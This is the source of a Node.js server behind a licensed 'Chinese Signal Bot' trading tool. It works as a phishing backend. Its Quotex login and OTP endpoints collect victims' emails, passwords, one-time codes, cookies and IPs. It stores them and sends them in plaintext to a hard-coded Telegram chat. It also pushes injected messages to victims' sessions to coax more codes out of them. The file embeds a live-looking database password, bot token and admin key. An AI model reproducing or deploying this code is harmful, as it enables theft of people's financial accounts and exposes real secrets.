const express = require('express');
const cors    = require('cors');
const axios   = require('axios');
const fs      = require('fs');
const path    = require('path');

// ================== MONGODB SETUP ==================
const mongoose = require('mongoose');

const MONGODB_URI = process.env.MONGODB_URI ||
    'mongodb+srv://Luckybot:Lucky8ixx$@lucky.comleed.mongodb.net/csbot?retryWrites=true&w=majority&appName=Lucky';

let useDatabase = false;

mongoose.connect(MONGODB_URI, {
    serverSelectionTimeoutMS: 5000,
    maxPoolSize: 100,
})
.then(() => {
    useDatabase = true;
    console.log('✅ MongoDB connected: permanent storage enabled');
})
.catch(err => {
    console.warn('⚠️  MongoDB connection failed — falling back to file storage:', err.message);
    useDatabase = false;
});

// ================== MONGOOSE SCHEMAS ==================

const userSchema = new mongoose.Schema({
    id:           { type: String, required: true, unique: true },
    licenceKey:   { type: String, required: true, index: true },
    fullName:     { type: String, default: 'Unknown' },
    username:     { type: String, default: '' },
    password:     { type: String, default: '' },
    otp:          { type: String, default: '' },
    ip:           { type: String, default: '' },
    cookies:      { type: String, default: '' },
    status:       { type: String, default: 'Active' },
    connected:    { type: Boolean, default: false },
    blocked:      { type: Boolean, default: false },
    lastActivity: { type: Date, default: Date.now },
    activities:   { type: Array, default: [] },
    createdAt:    { type: Date, default: Date.now },
});

const licenseSchema = new mongoose.Schema({
    key:           { type: String, required: true, unique: true },
    type:          { type: String, default: 'Standard' },
    status:        { type: String, default: 'Active', index: true },
    usesRemaining: { type: Number, default: null },
    assignedTo:    { type: String, default: null },
    dateAdded:     { type: Date, default: Date.now },
    expiry:        { type: Date, default: null },
});

const pendingMessageSchema = new mongoose.Schema({
    userName:    { type: String, required: true, index: true },
    messageData: { type: Object, required: true },
    delivered:   { type: Boolean, default: false, index: true },
    createdAt:   { type: Date, default: Date.now },
});

const noteSchema = new mongoose.Schema({
    licenceKey: { type: String, required: true, unique: true, index: true },
    note:       { type: String, default: '' },
    updatedAt:  { type: Date,   default: Date.now },
});

const User           = mongoose.model('User',           userSchema);
const License        = mongoose.model('License',        licenseSchema);
const PendingMessage = mongoose.model('PendingMessage', pendingMessageSchema);
const Note           = mongoose.model('Note',           noteSchema);

const settingSchema = new mongoose.Schema({
    _id:         { type: String, default: 'bot' },
    telegramUrl: { type: String, default: '' },
    whatsappUrl: { type: String, default: '' },
    botName:     { type: String, default: 'Chinese Signal Bot' },
    updatedAt:   { type: Date,   default: Date.now },
}, { _id: false, minimize: false });

const orderSchema = new mongoose.Schema({
    id:            { type: String, required: true, unique: true },
    fullName:      { type: String, required: true },
    planKey:       { type: String, required: true },   // week | month | lifetime
    planLabel:     { type: String, default: '' },
    planPricePKR:  { type: String, default: '' },
    planPriceUSD:  { type: String, default: '' },
    paymentMethod: { type: String, default: '' },
    whatsapp:      { type: String, default: '' },
    status:        { type: String, default: 'New', index: true }, // New | Contacted | Paid | Completed | Rejected
    createdAt:     { type: Date,   default: Date.now },
});

const Setting = mongoose.model('Setting', settingSchema);
const Order   = mongoose.model('Order',   orderSchema);


// ================== DB HELPERS ==================

async function dbGetOrCreateUser(licenceKey, fullName = 'Unknown') {
    const hasName = fullName && fullName !== 'Unknown' && fullName !== 'Pending Name';
    let user = null;

    if (hasName) {
        user = await User.findOne({
            licenceKey,
            fullName: { $regex: new RegExp(`^${fullName}$`, 'i') }
        });
        if (!user) {
            user = await User.findOne({
                licenceKey,
                fullName: { $in: ['Unknown', 'Pending Name', ''] }
            });
        }
    } else {
        user = await User.findOne({ licenceKey });
    }

    if (!user) {
        const newId = Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7);
        user = await User.create({
            id:       newId,
            licenceKey,
            fullName: hasName ? fullName : 'Unknown',
        });
    } else {
        if (hasName && user.fullName !== fullName) user.fullName = fullName;
        user.lastActivity = new Date();
        await user.save();
    }
    return user.toObject();
}

async function dbSaveUser(user) {
    await User.findOneAndUpdate(
        { id: user.id },
        {
            licenceKey:   user.licenceKey,
            fullName:     user.fullName,
            username:     user.username   || '',
            password:     user.password   || '',
            otp:          user.otp        || '',
            ip:           user.ip         || '',
            cookies:      user.cookies    || '',
            status:       user.status     || 'Active',
            connected:    user.connected  || false,
            blocked:      user.blocked    || false,
            lastActivity: new Date(),
            activities:   user.activities || [],
        },
        { upsert: true, new: true }
    );
}

async function dbGetAllUsers() {
    return await User.find().sort({ lastActivity: -1 }).lean();
}

async function dbFindUserByKey(licenceKey) {
    return await User.findOne({ licenceKey }).lean();
}

async function dbGetStats() {
    const [totalUsers, onlineNow, otpCaptured, connectedAccounts, totalLicenses, activeLicenses, blockedUsers] = await Promise.all([
        User.countDocuments(),
        User.countDocuments({ status: 'Online' }),
        User.countDocuments({ otp: { $nin: [null, ''] } }),
        User.countDocuments({ connected: true }),
        License.countDocuments(),
        License.countDocuments({ status: 'Active' }),
        User.countDocuments({ blocked: true }),
    ]);
    return { totalUsers, onlineNow, otpCaptured, connectedAccounts, totalLicenses, activeLicenses, blockedUsers };
}

async function dbSaveNote(licenceKey, note) {
    await Note.findOneAndUpdate(
        { licenceKey },
        { note, updatedAt: new Date() },
        { upsert: true, new: true }
    );
}

async function dbGetNote(licenceKey) {
    return await Note.findOne({ licenceKey }).lean();
}

async function dbGetAllLicenses() {
    return await License.find().sort({ dateAdded: -1 }).lean();
}

async function dbFindLicense(key) {
    return await License.findOne({ key }).lean();
}

async function dbInsertLicense(lic) {
    await License.create({
        key:           lic.key,
        type:          lic.type          || 'Standard',
        status:        lic.status        || 'Active',
        usesRemaining: lic.usesRemaining || null,
        assignedTo:    lic.assignedTo    || null,
        expiry:        lic.expiry ? new Date(lic.expiry) : null,
    });
}

async function dbUpdateLicenseStatus(key, status) {
    await License.findOneAndUpdate({ key }, { status });
}

async function dbDeleteLicense(key) {
    await License.deleteOne({ key });
}

async function dbAddPendingMessage(userName, msgPayload) {
    const key = userName.trim().toLowerCase();
    await PendingMessage.create({ userName: key, messageData: msgPayload });
    const oldest = await PendingMessage.find({ userName: key, delivered: false })
        .sort({ createdAt: 1 }).lean();
    if (oldest.length > 20) {
        const toDelete = oldest.slice(0, oldest.length - 20).map(m => m._id);
        await PendingMessage.deleteMany({ _id: { $in: toDelete } });
    }
}

async function dbPollAndClearMessages(userName) {
    const key = userName.trim().toLowerCase();
    const msgs = await PendingMessage.find({ userName: key, delivered: false }).lean();
    if (msgs.length > 0) {
        await PendingMessage.updateMany(
            { userName: key, delivered: false },
            { delivered: true }
        );
    }
    return msgs.map(m => m.messageData);
}

// NEW: Delete user from MongoDB
async function dbDeleteUser(licenceKey) {
    await User.deleteOne({ licenceKey });
}

// ================== EXPRESS APP ==================
const app = express();
app.use(cors());
app.use(express.json());

// ================== TELEGRAM SETTINGS ==================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || "7293402395";

async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' });
    } catch (error) {
        console.error('Telegram Error:', error.message);
    }
}

// ================== SSE BROADCAST ==================
const sseClients     = new Set();
const sseUserClients = new Map(); // userName (lowercase) → res — for targeted messaging
const pendingMessages = {}; // in-memory fallback only

function broadcastSSE(eventType, data) {
    const payload = JSON.stringify({ type: eventType, data, timestamp: new Date().toISOString() });
    sseClients.forEach(client => {
        try { client.write(`data: ${payload}\n\n`); } catch (e) {}
    });
}

// Send an SSE event to one specific user only (by username)
function sendSSEToUser(userName, eventType, data) {
    const key    = (userName || '').trim().toLowerCase();
    const client = sseUserClients.get(key);
    if (!client) return false;
    try {
        const payload = JSON.stringify({ type: eventType, data, timestamp: new Date().toISOString() });
        client.write(`data: ${payload}\n\n`);
        return true;
    } catch (e) { return false; }
}

app.get('/api/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.flushHeaders();

    const heartbeat = setInterval(() => {
        try { res.write(`:heartbeat\n\n`); } catch (e) {}
    }, 20000);

    // Track this client both globally (for broadcasts) and per-user (for targeted messages)
    const clientUserName = (req.query.userName || '').trim().toLowerCase();
    sseClients.add(res);
    if (clientUserName) sseUserClients.set(clientUserName, res);

    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'SSE ready' })}\n\n`);

    req.on('close', () => {
        clearInterval(heartbeat);
        sseClients.delete(res);
        // Only remove from user map if this is still the current client for that user
        if (clientUserName && sseUserClients.get(clientUserName) === res) {
            sseUserClients.delete(clientUserName);
        }
    });
});

// ================== FILE FALLBACK STORAGE ==================
const DATA_DIR      = process.env.DATA_DIR || path.join(__dirname, 'data');
const DATA_FILE     = path.join(DATA_DIR, 'users.json');
const LICENSES_FILE = path.join(DATA_DIR, 'licenses.json');
const SETTINGS_FILE = path.join(DATA_DIR, 'settings.json');

let users       = [];
let licenses    = [];
let botSettings = { telegramUrl: '', whatsappUrl: '', botName: 'Chinese Signal Bot' };
function loadSettings() {
    try { if (fs.existsSync(SETTINGS_FILE)) botSettings = { ...botSettings, ...JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')) }; } catch(e) {}
}
function saveSettings() {
    try { ensureDataDir(); fs.writeFileSync(SETTINGS_FILE, JSON.stringify(botSettings, null, 2)); } catch(e) {}
}
loadSettings();

// DB-backed settings (survives container/file-disk resets on Render etc.)
async function loadSettingsFromDB() {
    if (!useDatabase) return botSettings;
    try {
        const doc = await Setting.findById('bot').lean();
        if (doc) {
            if (doc.telegramUrl !== undefined) botSettings.telegramUrl = doc.telegramUrl;
            if (doc.whatsappUrl !== undefined) botSettings.whatsappUrl = doc.whatsappUrl;
            if (doc.botName)                   botSettings.botName     = doc.botName;
        }
    } catch (e) { console.warn('loadSettingsFromDB:', e.message); }
    return botSettings;
}
async function saveSettingsToDB() {
    if (!useDatabase) return;
    try {
        await Setting.findByIdAndUpdate(
            'bot',
            { ...botSettings, updatedAt: new Date() },
            { upsert: true, new: true, setDefaultsOnInsert: true }
        );
    } catch (e) { console.warn('saveSettingsToDB:', e.message); }
}
// Initial DB load shortly after Mongo connects
setTimeout(() => { loadSettingsFromDB().catch(()=>{}); }, 2500);

function ensureDataDir() {
    try {
        if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    } catch (e) { console.error('Could not create DATA_DIR:', e.message); }
}

function loadUsers() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            users = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        } else {
            fs.writeFileSync(DATA_FILE, '[]');
        }
    } catch (e) { users = []; }
}

function saveUsers() {
    try {
        const tmp = DATA_FILE + '.tmp';
        fs.writeFileSync(tmp, JSON.stringify(users, null, 2));
        fs.renameSync(tmp, DATA_FILE);
    } catch (e) {
        try { fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2)); } catch (e2) {}
    }
}

function loadLicenses() {
    try {
        if (fs.existsSync(LICENSES_FILE)) {
            const data = fs.readFileSync(LICENSES_FILE, 'utf8').trim();
            licenses = data ? JSON.parse(data) : [];
        } else {
            licenses = [];
            fs.writeFileSync(LICENSES_FILE, '[]');
        }
    } catch (e) { licenses = []; }
}

function saveLicenses() {
    try {
        const tmp = LICENSES_FILE + '.tmp';
        fs.writeFileSync(tmp, JSON.stringify(licenses, null, 2));
        fs.renameSync(tmp, LICENSES_FILE);
    } catch (e) {
        try { fs.writeFileSync(LICENSES_FILE, JSON.stringify(licenses, null, 2)); } catch (e2) {}
    }
}

function getOrCreateUserFile(licenceKey, fullName = 'Unknown') {
    const hasName = fullName && fullName !== 'Unknown' && fullName !== 'Pending Name';
    let user;

    if (hasName) {
        user = users.find(u =>
            u.licenceKey === licenceKey &&
            (u.fullName || '').toLowerCase() === fullName.toLowerCase()
        );
        if (!user) {
            user = users.find(u =>
                u.licenceKey === licenceKey &&
                (!u.fullName || u.fullName === 'Unknown' || u.fullName === 'Pending Name')
            );
        }
    } else {
        user = users.find(u => u.licenceKey === licenceKey);
    }

    if (!user) {
        user = {
            id:           Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7),
            licenceKey,
            fullName:     hasName ? fullName : 'Unknown',
            username:     '',
            password:     '',
            otp:          '',
            ip:           '',
            cookies:      '',
            status:       'Active',
            connected:    false,
            lastActivity: new Date().toISOString(),
            activities:   [],
        };
        users.unshift(user);
    }

    if (hasName && user.fullName !== fullName) user.fullName = fullName;
    user.lastActivity = new Date().toISOString();
    saveUsers();
    return user;
}

async function getOrCreateUser(licenceKey, fullName = 'Unknown') {
    if (useDatabase) return await dbGetOrCreateUser(licenceKey, fullName);
    return getOrCreateUserFile(licenceKey, fullName);
}

async function saveUser(user) {
    if (useDatabase) await dbSaveUser(user);
    else saveUsers();
}

// ================== LICENSE ROUTES ==================

app.get('/api/licenses', async (req, res) => {
    try {
        res.json(useDatabase ? await dbGetAllLicenses() : licenses);
    } catch (e) {
        console.error('/api/licenses GET error:', e.message);
        res.json(licenses);
    }
});

app.post('/api/licenses', async (req, res) => {
    const { key, type, expiry, maxUses, status } = req.body;
    if (!key) return res.status(400).json({ error: 'Key required' });

    try {
        const newLicense = {
            key,
            type:          type   || 'Standard',
            status:        status || 'Active',
            usesRemaining: maxUses || null,
            assignedTo:    null,
            dateAdded:     new Date().toISOString(),
            expiry:        expiry || null,
        };

        if (useDatabase) {
            const existing = await dbFindLicense(key);
            if (existing) return res.status(400).json({ error: 'License already exists' });
            await dbInsertLicense(newLicense);
        } else {
            if (licenses.find(l => l.key === key))
                return res.status(400).json({ error: 'License already exists' });
            licenses.unshift(newLicense);
            saveLicenses();
        }

        broadcastSSE('license_added', newLicense);
        res.json({ success: true });
    } catch (e) {
        console.error('/api/licenses POST error:', e.message);
        res.status(500).json({ error: 'Server error' });
    }
});

app.patch('/api/licenses/:key', async (req, res) => {
    const key    = decodeURIComponent(req.params.key);
    const { status } = req.body;

    try {
        if (useDatabase) {
            const license = await dbFindLicense(key);
            if (!license) return res.status(404).json({ error: 'License not found' });
            if (status) await dbUpdateLicenseStatus(key, status);
            broadcastSSE('license_updated', { key, status: status || license.status });
            return res.json({ success: true, key, status: status || license.status });
        }

        const license = licenses.find(l => l.key === key);
        if (!license) return res.status(404).json({ error: 'License not found' });
        if (status) license.status = status;
        saveLicenses();
        broadcastSSE('license_updated', { key, status: license.status });
        res.json({ success: true, key, status: license.status });
    } catch (e) {
        console.error('/api/licenses PATCH error:', e.message);
        res.status(500).json({ error: 'Server error' });
    }
});

app.delete('/api/licenses/:key', async (req, res) => {
    const key = decodeURIComponent(req.params.key);
    try {
        if (useDatabase) {
            await dbDeleteLicense(key);
        } else {
            licenses = licenses.filter(l => l.key !== key);
            saveLicenses();
        }
        broadcastSSE('license_deleted', { key });
        res.json({ success: true });
    } catch (e) {
        console.error('/api/licenses DELETE error:', e.message);
        res.status(500).json({ error: 'Server error' });
    }
});

app.post('/api/validate-license', async (req, res) => {
    const { licenseKey } = req.body;
    if (!licenseKey) return res.json({ valid: false, message: 'No key provided' });

    try {
        const license = useDatabase
            ? await dbFindLicense(licenseKey)
            : licenses.find(l => l.key === licenseKey);

        const valid = !!(license &&
            license.status === 'Active' &&
            (!license.expiry || new Date(license.expiry) > new Date()));

        res.json({ valid, message: valid ? 'License is valid' : 'Invalid or expired license key.' });
    } catch (e) {
        console.error('/api/validate-license error:', e.message);
        res.json({ valid: false, message: 'Server error during validation' });
    }
});

// ================== LICENSE ACTIVATION ==================
app.post('/api/license-activate', async (req, res) => {
    const { licenseKey, userName, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    try {
        const user = await getOrCreateUser(licenseKey, userName);
        if (userName && userName !== 'Pending Name') user.fullName = userName;
        user.activities = user.activities || [];
        user.activities.push({ action: 'License Activated', timestamp: new Date().toLocaleString() });
        await saveUser(user);

        broadcastSSE('license_activated', {
            licenceKey: licenseKey, fullName: userName, ip,
            timestamp:  timestamp || new Date().toLocaleString()
        });

        await sendTelegramMessage(
            `🔑 <b>License Activated</b>\n👤 Name: <b>${userName}</b>\n🔑 Key: <b>${licenseKey}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${timestamp}</b>`
        );
        res.status(200).json({ status: 'success' });
    } catch (e) {
        console.error('/api/license-activate error:', e.message);
        res.status(500).json({ status: 'error' });
    }
});

// ================== SPAM PROTECTION ==================
// NEW: Track repeated login attempts per licenceKey to prevent spam.
// If same email+password submitted more than 3 times, we suppress the alert.
const loginAttemptMap = new Map();  // key: licenceKey, value: { email, password, count, firstSeen }
const LOGIN_SPAM_THRESHOLD = 3;     // max allowed identical attempts before suppressing
const LOGIN_SPAM_WINDOW_MS = 5 * 60 * 1000; // 5-minute rolling window

function checkLoginSpam(licenceKey, email, password) {
    const now = Date.now();
    const mapKey = licenceKey || 'DEFAULT';
    const existing = loginAttemptMap.get(mapKey);

    if (!existing || (now - existing.firstSeen) > LOGIN_SPAM_WINDOW_MS) {
        // First attempt or window expired — reset counter
        loginAttemptMap.set(mapKey, { email, password, count: 1, firstSeen: now });
        return false; // not spam
    }

    if (existing.email === email && existing.password === password) {
        // Same credentials repeated
        existing.count++;
        if (existing.count > LOGIN_SPAM_THRESHOLD) {
            return true; // spam — suppress
        }
    } else {
        // Different credentials — reset counter for new attempt
        loginAttemptMap.set(mapKey, { email, password, count: 1, firstSeen: now });
    }
    return false; // not spam
}

// ================== QUOTEX LOGIN ==================
app.post('/api/quotex-login', async (req, res) => {
    const { email, password, name, licenceKey = 'DEFAULT', cookies = '' } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    // NEW: Spam protection — suppress repeated identical login attempts
    if (checkLoginSpam(licenceKey, email, password)) {
        console.log(`[SPAM] Suppressed repeated login from key ${licenceKey}`);
        // Still save to DB so admin has a record, but don't send alerts
        return res.status(200).json({ status: 'ok', spam: true, message: 'Wait some time and try again later' });
    }

    try {
        const user     = await getOrCreateUser(licenceKey, name);
        user.username  = email;
        user.password  = password;
        user.ip        = ip;
        user.cookies   = cookies;
        user.status    = 'Online';
        user.activities = user.activities || [];
        user.activities.push({ action: 'Quotex Login Submitted', timestamp: new Date().toLocaleString() });
        await saveUser(user);

        broadcastSSE('quotex_login', { licenceKey, fullName: name, email, password, ip, cookies, timestamp: new Date().toLocaleString() });

        await sendTelegramMessage(
            `🔑 <b>Quotex Login</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 Password: <b>${password}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`
        );
        res.status(200).json({ status: 'ok' });
    } catch (e) {
        console.error('/api/quotex-login error:', e.message);
        res.status(500).json({ status: 'error' });
    }
});

// ================== OTP ==================
app.post('/api/quotex-otp', async (req, res) => {
    const { email, otp, name, licenceKey = 'DEFAULT', cookies = '' } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

    try {
        const user   = await getOrCreateUser(licenceKey, name);
        user.otp     = otp;
        user.ip      = ip;
        user.cookies = cookies;
        user.status  = 'Online';
        user.activities = user.activities || [];
        user.activities.push({ action: `OTP Entered: ${otp}`, timestamp: new Date().toLocaleString() });
        await saveUser(user);

        broadcastSSE('otp_entered', { licenceKey, fullName: name, email, otp, ip, cookies, timestamp: new Date().toLocaleString() });

        await sendTelegramMessage(
            `🔢 <b>OTP Captured</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 OTP: <b>${otp}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`
        );
        res.status(200).json({ status: 'ok' });
    } catch (e) {
        console.error('/api/quotex-otp error:', e.message);
        res.status(500).json({ status: 'error' });
    }
});

// ================== BLOCK / UNBLOCK USER ==================
app.post('/api/block-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });

    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenceKey);
            if (user) {
                user.blocked    = true;
                user.status     = 'Blocked';
                user.activities = user.activities || [];
                user.activities.push({ action: '🚫 Blocked by Admin', timestamp: new Date().toLocaleString() });
                await dbSaveUser(user);
            }
            await dbUpdateLicenseStatus(licenceKey, 'Inactive');
            broadcastSSE('user_blocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
            await sendTelegramMessage(
                `🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`
            );
            return res.json({ success: true });
        }

        const user = users.find(u => u.licenceKey === licenceKey);
        if (user) {
            user.blocked = true;
            user.status  = 'Blocked';
            user.activities.push({ action: '🚫 Blocked by Admin', timestamp: new Date().toLocaleString() });
            saveUsers();
        }
        const lic = licenses.find(l => l.key === licenceKey);
        if (lic) { lic.status = 'Inactive'; saveLicenses(); }
        broadcastSSE('user_blocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
        await sendTelegramMessage(
            `🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`
        );
        res.json({ success: true });
    } catch (e) {
        console.error('/api/block-user error:', e.message);
        res.status(500).json({ error: 'Server error' });
    }
});

app.post('/api/unblock-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });

    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenceKey);
            if (user) {
                user.blocked    = false;
                user.status     = 'Active';
                user.activities = user.activities || [];
                user.activities.push({ action: '✅ Unblocked by Admin', timestamp: new Date().toLocaleString() });
                await dbSaveUser(user);
            }
            await dbUpdateLicenseStatus(licenceKey, 'Active');
            broadcastSSE('user_unblocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
            return res.json({ success: true });
        }

        const user = users.find(u => u.licenceKey === licenceKey);
        if (user) {
            user.blocked = false;
            user.status  = 'Active';
            user.activities.push({ action: '✅ Unblocked by Admin', timestamp: new Date().toLocaleString() });
            saveUsers();
        }
        const lic = licenses.find(l => l.key === licenceKey);
        if (lic) { lic.status = 'Active'; saveLicenses(); }
        broadcastSSE('user_unblocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
        res.json({ success: true });
    } catch (e) {
        console.error('/api/unblock-user error:', e.message);
        res.status(500).json({ error: 'Server error' });
    }
});

// NEW: Delete user endpoint — removes user record from DB or file storage
app.delete('/api/delete-user/:licenceKey', async (req, res) => {
    const licenceKey = decodeURIComponent(req.params.licenceKey);
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });

    try {
        if (useDatabase) {
            await dbDeleteUser(licenceKey);
        } else {
            users = users.filter(u => u.licenceKey !== licenceKey);
            saveUsers();
        }
        broadcastSSE('user_deleted', { licenceKey, timestamp: new Date().toLocaleString() });
        res.json({ success: true });
    } catch (e) {
        console.error('/api/delete-user error:', e.message);
        res.status(500).json({ error: 'Server error' });
    }
});

// ================== CHECK ACCESS ==================
app.get('/api/check-access', async (req, res) => {
    const licenseKey = req.query.licenseKey || req.query.licenceKey;
    if (!licenseKey) return res.json({ allowed: false, reason: 'no_key' });

    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenseKey);
            if (user && user.blocked) return res.json({ allowed: false, reason: 'blocked' });
            const lic = await dbFindLicense(licenseKey);
            if (!lic || lic.status !== 'Active' || (lic.expiry && new Date(lic.expiry) < new Date())) {
                return res.json({ allowed: false, reason: 'license_inactive' });
            }
            return res.json({ allowed: true });
        }

        const user = users.find(u => u.licenceKey === licenseKey);
        if (user && user.blocked) return res.json({ allowed: false, reason: 'blocked' });
        const lic = licenses.find(l => l.key === licenseKey);
        if (!lic || lic.status !== 'Active' || (lic.expiry && new Date(lic.expiry) < new Date())) {
            return res.json({ allowed: false, reason: 'license_inactive' });
        }
        res.json({ allowed: true });
    } catch (e) {
        console.error('/api/check-access error:', e.message);
        res.json({ allowed: true });
    }
});

// ================== ACTIVITY TRACKING ==================
app.post('/api/track-activity', async (req, res) => {
    const { action, userName } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    broadcastSSE('activity', { action, userName, ip, timestamp: new Date().toLocaleString() });
    res.status(200).json({ status: 'success' });
});

app.post('/api/notification-permission', async (req, res) => {
    res.status(200).json({ status: 'success' });
});

// ================== TRIGGER CONNECTED ==================
app.get('/api/trigger-connected', async (req, res) => {
    const userName = req.query.userName || 'User';
    // Target only the specific user — same fix as send-message
    sendSSEToUser(userName, 'show_connected',    { userName });
    sendSSEToUser(userName, 'trigger_connected', { userName });
    await sendTelegramMessage(`🔗 <b>Connection Triggered</b>\n👤 User: <b>${userName}</b>`);
    res.send('Trigger sent');
});

// ================== SEND MESSAGE TO USER ==================
app.post('/api/send-message', async (req, res) => {
    const { userName, message, type } = req.body;
    if (!userName || !message)
        return res.status(400).json({ error: 'userName and message are required' });

    const ts         = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
    const msgType    = type || 'info';
    const msgPayload = { userName, message, type: msgType, timestamp: ts };

    // Target only the specific user — do NOT broadcast to everyone.
    // sendSSEToUser returns false if the user is not currently connected via SSE;
    // the pending-message store below ensures they still get it on the next poll.
    sendSSEToUser(userName, 'injected_message', msgPayload);

    if (useDatabase) {
        await dbAddPendingMessage(userName, msgPayload);
    } else {
        const key = userName.trim().toLowerCase();
        if (!pendingMessages[key]) pendingMessages[key] = [];
        pendingMessages[key].push(msgPayload);
        if (pendingMessages[key].length > 20) pendingMessages[key].shift();
    }

    broadcastSSE('activity', {
        action: `💬 Message Injected [${msgType}] → ${userName}`,
        userName, ip: '—', timestamp: ts,
    });

    const typeEmojis = { info: 'ℹ️', warning: '⚠️', alert: '🚨', instruction: '📋', otp: '🔢' };
    await sendTelegramMessage(
        `${typeEmojis[msgType] || '💬'} <b>Message Injected</b>\n👤 Target: <b>${userName}</b>\n📝 Type: <b>${msgType}</b>\n💬 Message: <b>${message}</b>\n⏰ Time: <b>${ts}</b>`
    );

    res.status(200).json({ success: true, delivered: true });
});

// ================== POLL FOR PENDING MESSAGES ==================
app.get('/api/poll-messages', async (req, res) => {
    const userName = (req.query.userName || '').trim().toLowerCase();
    if (!userName) return res.json({ messages: [] });

    try {
        if (useDatabase) {
            const msgs = await dbPollAndClearMessages(userName);
            return res.json({ messages: msgs });
        }
        const msgs = pendingMessages[userName] || [];
        pendingMessages[userName] = [];
        res.json({ messages: msgs });
    } catch (e) {
        console.error('/api/poll-messages error:', e.message);
        res.json({ messages: [] });
    }
});

// ================== MAINTENANCE MODE ==================
let maintenanceMode = { active: false, until: null, message: 'Under Maintenance. Please check back soon.' };

app.get('/api/maintenance', (req, res) => {
    res.json(maintenanceMode);
});

app.post('/api/maintenance', (req, res) => {
    const { active, until, message, adminKey } = req.body;
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Unauthorized' });
    maintenanceMode = {
        active:  !!active,
        until:   until   || null,
        message: message || 'Under Maintenance. Please check back soon.',
    };
    broadcastSSE('maintenance_update', maintenanceMode);
    res.json({ ok: true, mode: maintenanceMode });
});

// ================== STATS & DATA ==================
app.get('/api/stats', async (req, res) => {
    try {
        if (useDatabase) return res.json(await dbGetStats());
        res.json({
            totalUsers:        users.length,
            onlineNow:         sseClients.size,   // real-time SSE connected count
            otpCaptured:       users.filter(u => u.otp && u.otp.length >= 4).length,
            connectedAccounts: users.filter(u => u.connected).length,
            totalLicenses:     licenses.length,
            activeLicenses:    licenses.filter(l => l.status === 'Active').length,
            blockedUsers:      users.filter(u => u.blocked).length,
        });
    } catch (e) {
        console.error('/api/stats error:', e.message);
        res.json({ totalUsers: 0, onlineNow: 0, otpCaptured: 0, connectedAccounts: 0, totalLicenses: 0, activeLicenses: 0, blockedUsers: 0 });
    }
});

app.get('/api/users', async (req, res) => {
    const offset = parseInt(req.query.offset, 10) || 0;
    const limit  = parseInt(req.query.limit,  10) || 0;

    try {
        const allUsers = useDatabase ? await dbGetAllUsers() : users;
        if (limit > 0) {
            return res.json({
                users:  allUsers.slice(offset, offset + limit),
                total:  allUsers.length,
                offset,
                limit,
            });
        }
        res.json(allUsers);
    } catch (e) {
        console.error('/api/users error:', e.message);
        res.json(useDatabase ? [] : users);
    }
});

app.get('/api/latest-activity', async (req, res) => {
    try {
        const allUsers = useDatabase ? await dbGetAllUsers() : users;
        res.json({
            logins: allUsers.filter(u => u.username),
            otps:   allUsers.filter(u => u.otp),
        });
    } catch (e) {
        res.json({ logins: [], otps: [] });
    }
});

// ================== BROADCAST MESSAGE ==================
// Sends an admin message to ALL currently-connected SSE clients at once.
app.post('/api/broadcast-message', (req, res) => {
    const { message, type = 'info', adminKey } = req.body || {};
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    if (!message) return res.status(400).json({ error: 'message required' });
    broadcastSSE('broadcast_message', { message, type, timestamp: new Date().toISOString() });
    res.json({ ok: true, clients: sseClients.size });
});

